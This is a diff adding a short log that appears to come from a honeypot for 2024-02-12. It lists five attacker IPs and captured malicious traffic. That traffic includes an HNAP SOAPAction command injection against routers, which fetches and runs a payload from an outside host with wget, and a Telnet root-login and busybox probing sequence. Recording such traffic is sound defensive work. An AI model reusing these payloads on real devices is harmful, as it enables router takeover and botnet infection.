@@ -1,0 +1,20 @@
+Top 5 IPs for 2024-02-12:
+
+101.44.162.217
+42.6.33.173
+103.135.70.47
+166.139.118.183
+201.249.23.149
+
+Malcious Commands seen:
+
+POST /HNAP1/ HTTP/1.1
+Host: <HOST IP>
+User-Agent: Mozila/5.0
+Accept-Encoding: gzip, deflate
+Accept: */*
+Connection: keep-alive
+SOAPAction: \"http://purenetworks.com/HNAP1/GetDeviceSettings/`cd && cd tmp && export PATH=$PATH:. && cd /tmp;wget http://31.220.3.140/multi;chmod 777 multi;sh multi dlink;rm -rf multi`\"
+Content-Length: 0
+
+root\r\n...root\r\nenable\r\nsystem\r\nshell\r\nsh\r\ncat /proc/mounts; /bin/busybox KWJMF\r\ncd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox KWJMF\r\ntftp; wget; /bin/busybox KWJMF\r\ndd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s\r\n/bin/busybox KWJMF
